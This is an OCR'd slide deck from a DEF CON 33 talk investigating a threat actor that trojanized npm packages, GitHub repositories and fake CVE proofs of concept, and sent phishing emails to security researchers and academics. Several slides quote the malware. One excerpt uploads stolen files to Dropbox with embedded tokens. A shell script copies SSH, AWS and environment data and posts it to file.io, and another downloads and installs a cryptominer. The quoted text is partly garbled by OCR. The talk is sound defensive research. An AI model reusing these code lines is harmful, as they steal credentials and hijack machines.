---
title: "Weaponizing Trust Investigating a Threat Actor Targeting Security Researchers and Academics"
speakers: ["Christophe Tafani-Dereeper Matt Muir"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Christophe Tafani-Dereeper Matt Muir - Weaponizing Trust Investigating a Threat Actor Targeting Security Researchers and Academics.pdf"
pages: 104
sha256: "3a297a93d54233c54da659ed7b7055560e03eef1634b4dfbecadc2528d412ac8"
text_chars: 38047
ocr_pages: 55
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.7
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:56:45Z"
---
# Weaponizing Trust Investigating a Threat Actor Targeting Security Researchers and Academics

**Speakers:** Christophe Tafani-Dereeper Matt Muir  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Christophe Tafani-Dereeper Matt Muir - Weaponizing Trust Investigating a Threat Actor Targeting Security Researchers and Academics.pdf` (104 pages)


## Slide 1

_Weaponizing Trust_ **Investigating a Threat Actor Targeting Security Researchers and Academics**

**Christophe Tafani-Dereeper Matt Muir**

## Slide 2

**Security research: expectations v.s. reality**

## Slide 3

**Security research: expectations v.s. reality**

## Slide 4

**id**

**Christophe Tafani-Dereeper**

##### **Matt Muir**

## Slide 5

<u>https://checkmarx.com/blog/dozens-of-machines-infected-year-long-npm-supply-chain-attack-combines-crypto-mining-and-data-theft/</u> by Yehuda Gelb

## Slide 6

**Same-same, but different**


> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Same-same, but different
+ Public + Published 12 years ago
The What
The xmlrpc module is a pure JavaScript XML-RPC server and client for node.js.
Pure JavaScript means that the XML parsing and XML building use pure JavaScript libraries, so
no extra C dependencies or build requirements. The xmlrpc module can be used as an XML-RPC
server, receiving method calls and responding with method responses, or as an XML-RPC client,
making method calls and receiving method responses, or as both.
1.3.18 + PL + Published 2 months ago
) Readme Bi code © 7 Dependencies
The What
The xmlrpc module is a pure JavaScript XML-RPC server and client for node.js.
Pure JavaScript means that the XML parsing and XML building use pure JavaScript libraries, so
no extra C dependencies or build requirements. The xmlrpc module can be used as an XML-RPC
server, receiving method calls and responding with method responses, or as an XML-RPC client,
making method calls and receiving method responses, or as both.
```

## Slide 7


> Recovered by OCR — confidence 67/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Y Oxengine_xmirpc-v1.3.18
VY package
JS validator.js
#!/bin/bash +)
const aQ_0x4394ad=a0_@x1d3b; (function(_@x345fbe,_O@x4beb8c
(parseInt (_@xece3@a(@x193) ) /(Ox1f4f+0x947+-0x2892) )+parse
```

## Slide 8


> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
const exfilArchiveName = systemUUID.os + ‘—" + timestamp + am |
const exfilArchivePath tempDir + '/' + exfilArchiveName;
debugLog("zipPath: " + exfilArchivePath) ;
await zip(dataCollectionDir, exfilArchivePath) ;
const exfilData = await fs.readFile(exfilArchivePath) ;
const dropboxUploadOptions = {
"path": '/' + exfilArchiveName,
"contents": exfilData
}).catch(error => {
```

## Slide 9

**Exfiltrating local files to Dropbox**


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exfiltrating local files to Dropbox
const {
Dropbox
} = require('dropbox');
const aQ@_@x3f150a = {
clientSecret: '"c6j642nz7k2gyuq",
refreshToken: "ZtRBk4WfngcAAAAAAAAAAYAQa4wHLxEXdInRczVAeZarh5VSmUggT YegPuYhODoh"
```

## Slide 10

{

"access_token": "sl.AbX9y6Fe3AuH5o66...", "expires_in": 14400,

"token_type": "bearer",

"scope": "account_info.read files.content.read files.metadata.read" }

## Slide 11


> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Developers
VERSION
DESCRIPTION
URL STRUCTURE
AUTHENTICATION
ENDPOINT
FORMAT
REQUIRED SCOPE
EXAMPLE
/get_current_account
Get information about the current user's account.
https://api.dropboxapi.com/2/users/get_current_account
User Authentication, Dropbox-API-Select-Admin (Whole Team)
RPC
account_info.read
```

## Slide 12

$ curl https://api.dropboxapi.com/2/users/get_current_account \ -H "Authorization: Bearer sl.AbX9y6Fe3AuH5o66..." {

"account_id": "dbid:AAH...",

: "US" "country" , "email": "paulmuller1977@proton.me" }

## Slide 13


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
3 HTTP Developers - Dropbox x +
Developers
/list_folder
VERSION
DESCRIPTION
URL STRUCTURE
AUTHENTICATION
ENDPOINT
FORMAT
REQUIRED SCOPE
# Incognito
Starts returning the contents of a folder.
https://api.dropboxapi.com/2/files/list_folder
User Authentication, App Authentication, Dropbox-AP|-Select-Admin (Whole
Team)
RPC
files. metadata.read
```

## Slide 14

Compromised system ID Time of compromise (/etc/machine-id)

c9a8611aac6a642eb10c66d3f0861814-1704446955685.zip ce5dea601727bf7df0668909a544e8bb-1702568243147.zip ad3bd8736299900b98c27dc6c2d757ae-1704156264262.zip

…

## Slide 15

## Slide 16

https://drive.fictionalcloud9x8z7.io:john.smith82:Kj8#mP9$vL2@ https://workspace.imaginaryvbox5y4w3.co:sarah.jones:N3wP@ssw0rd2023! https://academy.mockskills2n9m8.co:student1234:St#dentP@ss99 https://app.nonexistteam7k6j5.io:pm.user@:Pr0ject$Manager2 https://portal.fakebooks4h3g2.co:reader2023:B00kw0rm#2023 https://dash.mockmetrics1f0e9.io:data.analyst:D@t@2023Secure! https://hub.testspace8m7l6.co:team.member:C0ll@b0rate#Now https://docs.dummyfiles5k4j3.io:doc.user:F1l3Syst3m#2023 https://app.mockevents2h1g0.co:event.organizer:Ev3nt#Pl@n2023 https://board.imaginarytasks9n8m7.io:task.master:Tr@ck#T@sks2023

- _fictional credentials, for illustrative purposes only_

## Slide 17

# **390k credentials**

https://drive.fictionalcloud9x8z7.io:john.smith82:Kj8#mP9$vL2@ https://workspace.imaginaryvbox5y4w3.co:sarah.jones:N3wP@ssw0rd2023! https://academy.mockskills2n9m8.co:student1234:St#dentP@ss99 https://app.nonexistteam7k6j5.io:pm.user@:Pr0ject$Manager2 https://portal.fakebooks4h3g2.co:reader2023:B00kw0rm#2023 https://dash.mockmetrics1f0e9.io:data.analyst:D@t@2023Secure! https://hub.testspace8m7l6.co:team.member:C0ll@b0rate#Now https://docs.dummyfiles5k4j3.io:doc.user:F1l3Syst3m#2023 https://app.mockevents2h1g0.co:event.organizer:Ev3nt#Pl@n2023 https://board.imaginarytasks9n8m7.io:task.master:Tr@ck#T@sks2023

- _fictional credentials, for illustrative purposes only_

## Slide 18

#### **Confusion ensues**

**Who What When Where Why**

## Slide 19

0xengine/xmlrpc
Dropbox
Exfiltration


> Recovered by OCR — confidence 75/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@xengine/xmlrpc
mpm opbox
Exfiltration
```

## Slide 20


> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
XMRIG_URL=$REPO_URL/ raw/master/xmrig
XPRINTIDLE_URL=$REPO_URL/ raw/master/xprintidle
APP_URL=$REPO_URL/raw/master/Xsession.sh
LOCAL_PATH=$HOME/. local/bin
APPNAME=Xsession.sh
XMRIGNAME=xsession. auth
XPRINTIDLE_NAME=xprintidle
mkdir —p $LOCAL_PATH
curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL
curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL
curl -sL --output $LOCAL_PATH/$XPRINTIDLE_NAME $XPRINTIDLE_URL
```

## Slide 21


> Recovered by OCR — confidence 83/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(local awsdir="$HOME/.aws"
local asuredir="$HOME/.azure"
local electrumdir="$HOME/.electrum"
(cp $HOME/.bash_history $infodir/history.txt
cp -r $HOME/.ssh $infodir 2>/dev/null
ls -all $HOME > $infodir/lshome.txt 2>/dev/n
ls -all $HOME/.config > $infodir/\lsconf.txt
send_report() { env > $infodir/env.txt 2>/dev/null
fileio
} (local token=K24MAC4.W2TCNXF-FM1439Y-K32292Q-—XPFJYDY +)
curl -s --output /dev/null -X 'POST' \
"https://file.io/' \
-H ‘accept: application/json' \
-H “Authorization: Bearer $token" \
-F "file=@$tarfile" \
-F "expires=$expdate" \
-F 'maxDownloads=1' \
```

## Slide 22

0xengine/xmlrpc
Dropbox
Exfiltration
drops
Exfiltration
file.io
k0rn66/xmrdropper

## Slide 23


> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Nn Explore About FAQ Donate
No description
P master ~ 1) Finda file
@ robert | 630267c909 Additional dot dirs
B clean.sh ‘Added pubkey
G fileio.sh fix of exp date
B agrabinfo.sh Initial commit
D install.obf.sh fix of exp date
D install.obf.sh.b64 fix of exp date
D install.sh Stats
DB mailer.sh Initial commit
DB README.md ‘Added ip detection service
D to_repo.sn Initial commit
B xprintidie Initial commit
D Xsession.sh Additional dot dirs
Logic
2 months ago
2 months ago
2 months ago
2 months ago
2 months ago
2 months ago
2 months ago
2 months ago
2 months ago
2 months ago
2 months ago
install.sh is obfuscated and inserted into configure . install.sh is executed by configure : it downloads xmrig and Xsession.sh to $HOME/. local and
installs Xsession.sh as a user systemd daemon. Xsession.sh should be obfuscated as well. Xsession.sh checks for inactivity on the system and runs / stop xmrig
accordingly.
```

## Slide 24


> Recovered by OCR — confidence 77/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
7% korns6 - Codeberg.org x +
1A & hitps://codeberg.org/kOrn66
» / ‘4 G Repositories 2 & Projects
Updated 2 months ago
Email spam for xmrdropper
Updated 2 months ago
korn66
AX 0 followers - 0 following >
6 Joined on Oct 4, 2024
@ Packages
3) Public activity
¥ Starred repositories
Q
Filter + Sort +
Shell Yo PO
@ HTML vo Po
```

## Slide 25

**Targeting academics**

## Slide 26

$ sqlite3 emails.db sqlite> .tables arxiv sqlite> select count(*) from arxiv; 2758


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(iv spam
<> body.html
= emails.db
= final.txt
= headers.txt
$ sender.sh
$ sqlite3 emails.db
sqlite> .tables
arxiv
sqlite> select count(*) from arxiv;
2758
```

## Slide 27


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
P master ~ 1} spam /headers.txt
robert 3db597627e Initial commit
Permalink
6 lines | 225 B | Text
From: <cicd@opencompiled.org>
To: <paulmuller19777@gmail. com>
Subject: “Notification: Important CPU Microcode Update for High-Performance Computing (HPC) Users Inbox"
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8
```

## Slide 28


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
This is an automated message generated by the kernel.org Cl/CD
bot.
Our system has identified that you are using high-performance computing (HPC)
resources in your research work.
We would like to inform you about a recent CPU microcode update that significantly
improves the performance of SIMD instructions, boosting the efficiency of applications
such as GROMACS, NAMD, VMD, and any OpenMP Fortran or C-based code.
For users with Intel processors, the Intel Microcode 0x129 Update offers notable
performance enhancements, specifically for Intel Core 13th and 14th Gen desktop
processors.
Similar updates may be available for other architectures, including AMD and ARM,
depending on the manufacturer's releases.
This patch is applied in user-space, meaning no administrative (sysop) privileges are
required for installation.
For more information and relevant patches for your system architecture, please visit:
https:/Awwww.opencompiled.org/microcode-patch-linux
Thank you for your attention.
© 2024 OpenCompiled.org
```

## Slide 29


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Open Compiled
Advancing the Linux Kernel: Performance, Scalability, and Security for the Future of High-Performance
Computing 62
Important CPU Microcode Update for High-Performance Computing (HP'
For users with Intel processors, the Intel Microcode 0x129 Update offers notable performance enhancements, specifically
for Intel Core 13th and 14th Gen desktop processors. Similar updates may be available for other architectures, including
AMD and ARM, depending on the manufacturer’s releases.
This patch is applied in user-space, meaning no administrative (sysop) privileges are required for installation.
To apply the patch, log in to the terminal used to execute HPC applications and copy-paste the following:
x129.sh | bash
The change logs:
Author: Greg Kroah-Hartman
Date: Wed Sep 18 19:25:18 2024 +0200
Linux 6.10.11
Tested-by: Ronald Warsow
Tested-by: Peter Schneider
Tested-by: Pavel Machek (CIP)
Tested-by: Mark Brown
Tested-by: Jon Hunter
Tested-by: Florian Fainelli
Tested-by: Ron Economos
Tested-by: Salvatore Bonaccorso
Tested-by: Kexy Biscuit
Signed-off-by: Greg Kroah-Hartman
```

## Slide 30

github.com/opencompiled-oss/kernel-patch/

drops

same as before k0rn66/xmrdropper

## Slide 31

0xengine/xmlrpc
Dropbox
Exfiltration
drops
Exfiltration
file.io
k0rn66/xmrdropper

## Slide 32

0xengine/xmlrpc
Phishing email
Dropbox
Exfiltration
drops
Exfiltration
file.io
opencompiled.org k0rn66/xmrdropper

## Slide 33

0xengine/xmlrpc
Phishing email ?
Dropbox
Exfiltration
drops
Exfiltration
file.io
opencompiled.org k0rn66/xmrdropper

## Slide 34

0xengine/xmlrpc
Phishing email ?
Dropbox
targets.txt
drops
const targetsDataPath = dataCollectionDir + "/targets.txt";
await fs.copyFile(targetsFilePath, targetsDataPath);
Exfiltration
file.io
opencompiled.org k0rn66/xmrdropper

## Slide 35


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Name Last commit Message
B bin 2023-09-15 Initial commit
B src 2024-01-29 separator support to checker
6 .gitignore 51B 2024-01-03 Added socks support
B README.md 5.3KB 2024-09-22 Updated README.md, updated modules
6 package-lock.json 39.33KB 2024-10-04 Update modules
README.md
About
yawpp stands for Yet Another WordPress Poster.
yawpp includes two scripts, checker.js and poster.js.
checker.js checks validity of Wordpress credentials using two methods: http wplogin and wordpress xmlrpc API.
The script works fast with configurable number of simultaneous requests.
```

## Slide 36


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Example 2
Checks with default 10 requests in parallel.
node src/checker.js -t targets.txt
Example 3
Checks with 100 requests in parallel with non-default separator ":" (default is ";")
node src/checker.js -t targets.txt -n 10@ -s :
```

## Slide 37


> Recovered by OCR — confidence 90/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
2 "dependencies": {
3 "@@xengine/xmlrpc": "41.3.18",
```

## Slide 38

###### **Trojanized Wordpress credentials checker**

Phishing email
0xengine/xmlrpc
Dropbox
Exfiltration
Exfiltration
file.io
opencompiled.org k0rn66/xmrdropper

## Slide 39

###### **Trojanized Wordpress credentials checker**

Phishing email
0xengine/xmlrpc
Dropbox
Exfiltration
Exfiltration
file.io
opencompiled.org k0rn66/xmrdropper

## Slide 40

**2** Use 'yawpp' to validate **1** stolen credentials Acquire stolen credentials Offensive actor yawpp

**3** Credentials are exfiltrated 0xengine/xmlrpc to MUT-1244's Dropbox account **Dropbox**

## Slide 41

## Slide 42

## Slide 43

**PIVOT!**

## Slide 44


> Recovered by OCR — confidence 71/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Filter by 2 files (87 ms) few) (=
| © code 2 @ c33d3r20/shareaza-for-linux - build.sh ©@ Shell. [ master
1) Pull requests °
©) Discussions o » @® attenbit/cheatengine-for-linux - build.sh @ Shell . master
Repositories
@ 33d3r20/shareaza-for-linux
@ More repositories...
Advanced
© owner
© symbol
© Exclude archived
(@ Advanced search
```

## Slide 45

## Slide 46


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
git GH Archive ose Tweet
Open-source developers all over the world are working on millions of projects: writing code & documentation,
fixing & submitting bugs, and so forth. GH Archive is a project to record the public GitHub timeline, archive it,
and make it easily accessible for further analysis.
GitHub provides 15+ event types, which range from new commits and fork events, to opening new tickets, commenting, and
adding members to a project. These events are aggregated into hourly archives, which you can access with any HTTP client:
Query Command
Activity for 1/1/2015 @ 3PM UTC wget https://data.gharchive. org/2015-01-01-15. json.gz
Activity for 1/1/2015 wget https://data.gharchive. org/2015-01-01-{0. .23}.json.gz
Activity for all of January 2015 wget https://data.gharchive. org/2015-01-{01. .31}-{0. .23}.json.gz
```

## Slide 47

SELECT * FROM `githubarchive.year.202*` = WHERE actor.login 'foobar'


> Recovered by OCR — confidence 91/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SELECT
WHERE actor.login=' foobar'
@ This query will process 21.57 TB when run.
Price (USD)
```

## Slide 48

SELECT repo_name, event_type, COUNT(*) AS num_commits

FROM github_events

WHERE actor_login = 'torvalds' GROUP BY repo_name, event_type ORDER BY num_commits DESC

<u>https://play.clickhouse.com/play</u>

## Slide 49

$ curl "https://play.clickhouse.com/?user=explorer" \

-d "select count(*) from github_events where actor_login = 'christophetd'" 7941


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
THE FASTEST
THINGS ON EARTH
CHEETAH AIRPLANE
ee SPEED OF LIGHT
S$ curl "https://play.clickhouse.com/?user=explorer" \
-d "select count(*) from github_events
where actor_login = '‘christophetd'"
7941
```

## Slide 50

paulmuller1977

## Slide 51

aifuzzer/poc-CVE-2020-35489 paulmuller1977 ethgeeks/qzip2


> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
IT'S AN OLDER COMMIT, SIR
BUT IT CHECKS OUT
aifuzzer/poc-CVE-2029-35489 paulmuller1977 ethgeeks/qzip2
```

## Slide 52

aifuzzer ethgeeks

aifuzzer/poc-CVE-2020-35489

paulmuller1977 ethgeeks/qzip2

## Slide 53

###### paulmuller1977/pdf-watermark-remover

paulmuller1977/yawpp

aifuzzer ethgeeks
aifuzzer/poc-CVE-2020-35489 paulmuller1977 ethgeeks/qzip2

## Slide 54

## Slide 55

**Malicious POCs and where to find them**

## Slide 56


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
©) githubb002 (tr3zuryy) -Gith x
tr3zuryy
githubb002
Follow
@ Joined 3 weeks ago
Block or Report
(0 Overview ( Repositories 1 (6 Projects © Packages
Popular repositories
poc-CVE-2020-35489 Public
poc-CVE-2020-35489
2 contributions in the last year
Dec Jan Feb
Mon
Wed
Fri
Learn how we count contributions
Contribution activity
December 2024
@@ More
```

## Slide 57


> Recovered by OCR — confidence 96/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
How to exploit CVE-2001-1473
We employed a novel approach to an age-old vulnerability in the SSH-1 protocol, as described by CVE-2001-1473.
This vulnerability enables a Man-in-the-Middle (MITM) server to intercept an SSH-1 session between a client and a
vulnerable server, potentially exposing the user's private key. However, executing a practical attack necessitates
the client's usage of the attacking server as a hopping node and granting permission for unknown server keys,
significantly increasing the complexity of a successful exploit.
Our adaptation of the original attack method enables the extraction of the SSH server's private key itself, offering
access to the vulnerable server with sshd permissions. Notably, this modified approach eliminates the MITM
requirement and can be executed directly against the vulnerable server.
For technical details, read our paper.
Install
make
make install
The code is installed in /usr/local/bin .
```

## Slide 58


> Recovered by OCR — confidence 96/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CVE-2019-11248 Exploitation PoC (RCE)
Overview
This repository contains a proof-of-concept (PoC) exploit for CVE-2019-11248, a medium-severity vulnerability
in Kubernetes' Kubelet, which can lead to Remote Code Execution (RCE) under certain conditions. The
vulnerability stems from the exposure of the /debug/pprof endpoint on the Kubelet's healthz port. This PoC
showcases a novel method to escalate the initial information disclosure into a full-blown RCE attack, utilizing
unprotected memory and internal Kubelet data.
What's New?
While previous discussions around this CVE primarily focused on information leakage and denial-of-service
(DoS) attacks, this PoC demonstrates a previously unused attack vector that allows for code injection and
execution on the underlying system by leveraging the exposed Kubelet memory addresses and profiling data.
```

## Slide 59


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
‘> feedly CVEs Threat Intelligence Resources Vv Changelog
CVE-2019-11248
Exploit
CVE-2019-11248
Missing Authorization (CWE-862)
Published: Aug 29, 2019 / Upda
ck Updates £2 Track Exploits }
CVSS 8.2
EPSS 90.9%
Summary
The debugging endpoint /debug/pprof is exposed over the unauthenticated Kubelet healthz port in Kubernetes.
This exposure can potentially leak sensitive information such as internal Kubelet memory addresses and
configuration. The vulnerability affects Kubernetes versions prior to 1.15.0, 1.14.4, 1.13.8, and 1.12.10. The issue is
of medium severity but is not exposed by the default configuration.
Impact
This vulnerability could lead to unauthorized access to sensitive information, including internal Kubelet memory
addresses and configuration. Additionally, it may allow for limited denial of service attacks. The CVSS v3.1 base
score is 8.2 (High), with the following vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L. This indicates a
high confidentiality impact and low availability impact, with no integrity impact. The attack vector is network-
based, requiring no privileges or user interaction.
```

## Slide 60

malicious PoC


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Threat Intelligence Resources v Changelog
Affected Systems
{© Kubernetes / kubernetes
Exploits
© https://github.com/nop2nop/cve-2019-11248
Patches
& github.com
```

## Slide 61

Trojanized GitHub repositories  Trojanized GitHub repositories
(cluster 3) (cluster 1)
0xengine/meow 0xengine/xmlrpc
Dropbox
Exfiltration
Exfiltration
file.io
k0rn66/xmrdropper
Trojanized GitHub repositories
(cluster 2)

## Slide 62


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CVE PoC BLOG TAGS ABOUT
CVE PoC
Proof-of-Concepts for Specific CVEs: Demonstrations and
Insights
POC CVE-2020-1938
i Posted on January 11, 2025 | @ 3 minutes | 499 words | & admin
CVE-2020-1938 is a critical vulnerability affecting the Apache Tomcat server that allows
remote code execution (RCE). It specifically concerns the AJP (Apache JServ Protocol)
connector, which is often enabled by default. [Read More]
POC CVE-2023-3824
im Posted on January 11,2025 | @ 3 minutes | 531 words | & admin
CVE-2023-3824 is a critical remote code execution (RCE) vulnerability in PHP, affecting
versions 8.0.x (before 8.0.30), 8.1.x (before 8.1.22), and 8.2.x (before 8.2.8). The
vulnerability arises from insufficient length checking when processing PHAR files (PHP’s
archive format), specifically when reading PHAR directory entries in the Phar::loadPhar()
function. [Read More]
#eve-poc wnload
```

## Slide 63


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Usage
Clone the repo:
git clone git@codeberg.org:bluef1sher/poc—cve—2020-1938. git
Run the script:
usage: CVE-2020-1938.py [-h] [-p PORT] [-f FILE] target
positional arguments:
target Hostname or IP to attack
options:
-h, --help show this help message and exit
-p PORT, --port PORT AJP port to attack (default is 8009)
-f FILE, --file FILE file path on the server(default is WEB-INF/web.xm1)
#cve-poc #download
```

## Slide 64


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Referring page
Drive Traffic Faster with Fiverr! © 4.8 Stars
Guest Posting for Backlinks: A Strategy You
Must Try — iTxoft
ttos://link.itxoft
| Hope It Will Work — admin
No Middlemen, No Markups: Direct Chat
with Us for Quality Dofollow SEO Backlinks
to Boost Ahrefs DR, Moz DA & Majestic TF -
Talk to Real Experts—Zero Spam, All Niches
(Gambling Included). See Results First, Then
Pay!
Boost Ahrefs DR, Moz DA, and Majestic TF
with Proven Backlinks for All Niches,
Including Gambling and High-Competition
Anchor and target URL
Fiverr's tactics: A must for cvepoc.top [J
cvepoc.top, unstoppable growth meets
unstoppable resiliency—iTxoft.com ensures both.
ttps://cvey p/
Gambling & All Niches Expertise: Order Guest
Posts & Dofollow Backlinks for https://cvepoc.top
—See Improved DR, DA & TF Immediately!
Boost https://cvepoc.top For Ahrefs DR, Moz DA,
and Majestic TF with Quality Dofollow Backlinks
```

## Slide 65


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
cvepoc
@cvepoc
RE research, Oproject
=) Joined January 2025
2Following 7 Followers
Not followed by anyone you're following
```

## Slide 66


> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(€ evepoc @cvepoc - 12 Jan ‘e, a
»
CVE-2020-1938 is a critical vulnerability affecting the Apache Tomcat
server that allows remote code execution (RCE). It specifically concerns
the AJP (Apache JServ Protocol) connector, which is often enabled by
default.
POC CVE-2020-1938
From cvepoc.top
```

## Slide 67

**Blockchain, cryptocurrency and web3**

## Slide 68


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Crypto Forex Leads
Crypto and Forex Leads And FTDs For Free
We share more than just links to lead databases; our site also features industry-related articles. If you're solely
Interested in downloads, simply visit tags and click on download.
To search the site, use google. For example, search site for crypto leads
crypto leads
Wordpress 5.9, 6.0, 6.1 with WooCommerce plugin
RCE exploit
@ Posted on December 26, 2023 | @ 2 minutes | 228 words |& admin
‘An RCE in Wordpress 5.9, 6.0 and 6.2 with installed WooCommerce plugin versions 7.8.2 to 8.3.0 has been found using
the technique of machine learning-based fuzzing (see references). We called the exploit monera. [Read More
exploit rce wordpress
How to exploit CVE-2001-1473
@ Posted on December 14, 2023 | @ 3 minutes | @ 436 words | & admin
We employed a novel approach to an age-old vulnerability in the SSH-1 protocol, as described by CVE-2001-1473. This
vulnerability enables a Man-in-the-Middle (MITM) server to intercept an SSH-1 session between a client and a
vulnerable server, potentially exposing the user's private key. (Re:
cve exploit download
Empirical modeling of high-income and emerging
stock and Forex market return volatility using Markov}
switching GARCH models
i Posted on December 8, 2023 | @ 1 minutes | 180 words | & admin
Using weekly data for stock and Forex market returns, a set of MS-GARCH models is estimated for a group of high-
Income (HI) countries and emerging market economies (EMEs) using algorithms proposed by Augustyniak (2014) and
Ardia et al. [Read More!
```

## Slide 69


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ethgeeks
ethgeeks
Follow
1 follower - 0 following
Block or Report
1 Overview [{ Repositories 10 fA Projects © Packages YY Stars 9
Popular repositories
tokenrecovery Public
ERC20 tokens recovery utility
@ocam wo Y1
tools-online Public
Useful tools online
wa
cliw Public
CLI wallet, a command line replacement for metamask
qzip2 Public
qzip2 archiver
@ocam 9
airdrop Public
ethereum data message sender and more
vitbrain Public
etheum contract analyzer for SWE
Something went wrong, please refresh the page to try again.
If the problem persists, check the GitHub status page or contact support.
```

## Slide 70


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TokenRecovery
( a]
TokenRecovery
Get back ERC20 tokens mistakenly sent to contracts
TokenRecovery is a command line utility which tries to recover ERC20 tokens from
contract addresses.
Terminal
Downloads
© Windows binary
¢ Linux binary
The code is open source: Github repo
How to use the program: Tutorial
TUTORIAL
ABOUT
BLOG
TAGS
```

## Slide 71


> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Established in the year 2019, EthGeeks stands as a collective of EVM researchers with
a central dedication to fortifying the security of the Ethereum network. Our foremost
endeavor revolves around meticulously scrutinizing operational contracts, which
serve as linchpins for users across the global spectrum. Our overarching objective
encapsulates the augmentation of the challenges associated with uncovering and
capitalizing on security loopholes. Through our unwavering commitment, we aspire
to elevate the overall safety and impregnability of Web3 for all.
Our purview of action extends to the thorough exploration of vulnerabilities within
contracts across various EVM-compatible chains. The insights gleaned from these
research endeavors are subsequently leveraged to rectify grave security
shortcomings. This initiative not only enhances our grasp of the mechanics behind
exploit-driven assaults but also propels enduring, foundational enhancements to the
realm of security.
\ Our repo: https: //github.com /ethgeeks yy,
```

## Slide 72

Sounds a bit like “Paul Muller”


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Medium Q Search
How EthGeeks’ TokenRecovery
Utility Restored My Mistakenly Sent
ERC-20 Tokens
O Paulina Buller (Fotiow ) 3minread - Aug 17, 2023
```

## Slide 73

It _is_ Paul Muller!


> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Medium = © search
Get unlimited access to the best of Medium for less than $1/week. Become a member
How EthGeeks’ TokenRecovery
Utility Restored My Mistakenly Sent
ERC-20 Tokens
O Paulina Buller 3minread - Aug 17,2023
```

## Slide 74


> Recovered by OCR — confidence 93/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Dendrum »
1 follower - 0 following
3 Questions
How does the Ethereum blockchain ensure transaction ordering
consistency across its distributed network, especially in scenarios
involving multiple smart contracts executing concurrently and generating
interdependent transactions?
No answer yet - Last followed 1y
Are Al and quantum computing a danger for cryptocurrency security?
No answer yet - Last followed 1y
Quora is filled by scammers. I'm a crypto developer and | see everything
is scammed. Does not Quora use some moderation? +
1 answer - Last followed 2y
